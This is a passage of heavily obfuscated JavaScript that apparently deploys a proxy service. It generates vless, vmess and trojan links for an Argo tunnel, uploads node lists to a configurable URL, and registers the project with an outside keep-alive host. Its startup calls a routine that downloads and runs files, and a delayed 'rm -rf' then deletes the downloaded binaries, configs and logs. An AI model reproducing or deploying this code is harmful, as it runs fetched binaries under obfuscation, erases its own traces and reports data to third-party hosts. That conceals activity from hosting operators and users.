_0x52be33=_0xdc23,_0x21a193={'v':'2','ps':''+_0x1ae844,'add':CFIP,'port':CFPORT,'id':UUID,'aid':'0','scy':_0x52be33(_0x5c289f._0xa81a3c),'net':'ws','type':'none','host':_0x4c999f,'path':'/vmess-argo?ed=2560','tls':_0x52be33(0xba),'sni':_0x4c999f,'alpn':'','fp':_0x52be33(0x10c)},_0x4bfa17='\x0avless://'+UUID+'@'+CFIP+':'+CFPORT+'?encryption=none&security=tls&sni='+_0x4c999f+_0x52be33(0x116)+_0x4c999f+'&path=%2Fvless-argo%3Fed%3D2560#'+_0x1ae844+_0x52be33(_0x5c289f._0x55fcf6)+Buffer[_0x52be33(_0x5c289f._0x1f6537)](JSON[_0x52be33(_0x5c289f._0x94cd92)](_0x21a193))[_0x52be33(0xc1)](_0x52be33(_0x5c289f._0x3da771))+_0x52be33(_0x5c289f._0x153ada)+UUID+'@'+CFIP+':'+CFPORT+_0x52be33(0x98)+_0x4c999f+_0x52be33(0x116)+_0x4c999f+_0x52be33(0xf9)+_0x1ae844+_0x52be33(0xa5);console['log'](Buffer[_0x52be33(_0x5c289f._0x3b9f97)](_0x4bfa17)[_0x52be33(0xc1)](_0x52be33(_0x5c289f._0x3da771))),fs['writeFileSync'](subPath,Buffer[_0x52be33(0x8c)](_0x4bfa17)[_0x52be33(0xc1)](_0x52be33(0x118))),console[_0x52be33(_0x5c289f._0x503457)](FILE_PATH+_0x52be33(0xb9)),uploadNodes(),app[_0x52be33(_0x5c289f._0x20798c)]('/'+SUB_PATH,(_0x3a9925,_0x314df5)=>{const _0x433e41=_0x52be33,_0x29127d=Buffer[_0x433e41(_0x287d6e._0x1ab432)](_0x4bfa17)[_0x433e41(_0x287d6e._0x23a95c)](_0x433e41(0x118));_0x314df5['set'](_0x433e41(0xdb),_0x433e41(0xc2)),_0x314df5[_0x433e41(0xbb)](_0x29127d);}),_0x16fc88(_0x4bfa17);},0x7d0);});}}async function uploadNodes(){const _0x2b1491={_0x280e8e:0x113,_0x4859a6:0xc0,_0x3a54fe:0xe2,_0x537fd0:0x139,_0x34bf83:0xf6,_0x4b3dfd:0xe9,_0xc453e3:0xda,_0x1ad72c:0xc4},_0x4d843f=_0x2a1c28;if(UPLOAD_URL&&PROJECT_URL){const _0x21959e=PROJECT_URL+'/'+SUB_PATH,_0x286914={'subscription':[_0x21959e]};try{const _0x22c742=await axios[_0x4d843f(0xda)](UPLOAD_URL+_0x4d843f(_0x2b1491._0x280e8e),_0x286914,{'headers':{'Content-Type':_0x4d843f(0xb4)}});return _0x22c742&&_0x22c742[_0x4d843f(_0x2b1491._0x4859a6)]===0xc8?(console[_0x4d843f(0x102)](_0x4d843f(_0x2b1491._0x3a54fe)),_0x22c742):null;}catch(_0x1191fe){if(_0x1191fe[_0x4d843f(_0x2b1491._0x537fd0)]){if(_0x1191fe[_0x4d843f(0x139)]['status']===0x190){}}}}else{if(UPLOAD_URL){if(!fs[_0x4d843f(0xf4)](listPath))return;const _0x52fe56=fs[_0x4d843f(_0x2b1491._0x34bf83)](listPath,_0x4d843f(0xcf)),_0x3925d4=_0x52fe56[_0x4d843f(0x101)]('\x0a')['filter'](_0x427f8f=>/(vless|vmess|trojan|hysteria2|tuic):\/\//[_0x4d843f(0x124)](_0x427f8f));if(_0x3925d4[_0x4d843f(0xd1)]===0x0)return;const _0x335429=JSON[_0x4d843f(_0x2b1491._0x4b3dfd)]({'nodes':_0x3925d4});try{const _0x5f31a7=await axios[_0x4d843f(_0x2b1491._0xc453e3)](UPLOAD_URL+_0x4d843f(_0x2b1491._0x1ad72c),_0x335429,{'headers':{'Content-Type':'application/json'}});return _0x5f31a7&&_0x5f31a7[_0x4d843f(0xc0)]===0xc8?(console[_0x4d843f(0x102)](_0x4d843f(0x111)),_0x5f31a7):null;}catch(_0x2e11f9){return null;}}else return;}}function cleanFiles(){const _0x232721={_0x35013d:0xb1,_0x53d8db:0xc3},_0x36f1a7={_0x459f68:0xa9,_0x196aaf:0x102};setTimeout(()=>{const _0xc1a0c7={_0x1f1c87:0x102},_0x337f3c=_0xdc23,_0x921779=[bootLogPath,configPath,webPath,botPath];if(NEZHA_PORT)_0x921779['push'](npmPath);else NEZHA_SERVER&&NEZHA_KEY&&_0x921779[_0x337f3c(0xfd)](phpPath);process['platform']==='win32'?exec(_0x337f3c(_0x232721._0x35013d)+_0x921779['join']('\x20')+'\x20>\x20nul\x202>&1',_0x3b5547=>{const _0x12ae75=_0x337f3c;console[_0x12ae75(0xa9)](),console[_0x12ae75(_0xc1a0c7._0x1f1c87)](_0x12ae75(0x99)),console['log']('Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!');}):exec('rm\x20-rf\x20'+_0x921779['join']('\x20')+_0x337f3c(_0x232721._0x53d8db),_0x2a2f93=>{const _0x4cce78=_0x337f3c;console[_0x4cce78(_0x36f1a7._0x459f68)](),console[_0x4cce78(0x102)](_0x4cce78(0x99)),console[_0x4cce78(_0x36f1a7._0x196aaf)](_0x4cce78(0x10b));});},0x15f90);}cleanFiles();async function AddVisitTask(){const _0x5ed67b={_0x1518e2:0x122,_0x62b104:0xda,_0x33c089:0x102,_0x13691f:0x11b,_0xd6474e:0xf3},_0xa6499f=_0x2a1c28;if(!AUTO_ACCESS||!PROJECT_URL){console['log'](_0xa6499f(_0x5ed67b._0x1518e2));return;}try{const _0x5bdc7d=await axios[_0xa6499f(_0x5ed67b._0x62b104)]('https://oooo.serv00.net/add-url',{'url':PROJECT_URL},{'headers':{'Content-Type':_0xa6499f(0xb4)}});return console[_0xa6499f(_0x5ed67b._0x33c089)](_0xa6499f(0x114)),_0x5bdc7d;}catch(_0x24a44a){return console[_0xa6499f(_0x5ed67b._0x13691f)]('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x24a44a[_0xa6499f(_0x5ed67b._0xd6474e)]),null;}}function _0xdc23(_0x512670,_0x227547){const _0x1bb995=_0x1bb9();return _0xdc23=function(_0xdc2301,_0x21fb04){_0xdc2301=_0xdc2301-0x82;let _0x37cafa=_0x1bb995[_0xdc2301];return _0x37cafa;},_0xdc23(_0x512670,_0x227547);}async function startserver(){const _0x13110e={_0x1c2d20:0x11b},_0x4b1e29=_0x2a1c28;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x373bad){console[_0x4b1e29(_0x13110e._0x1c2d20)](_0x4b1e29(0xec),_0x373bad);}}startserver()[_0x2a1c28(0x87)](_0x5f4f16=>{const _0x5630ca={_0x3b29ce:0x11b,_0x5dfcd2:0xed},_0x10eaf7=_0x2a1c28;console[_0x10eaf7(_0x5630ca._0x3b29ce)](_0x10eaf7(_0x5630ca._0x5dfcd2),_0x5f4f16);}),app[_0x2a1c28(0xe5)](PORT,()=>console[_0x2a1c28(0x102)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
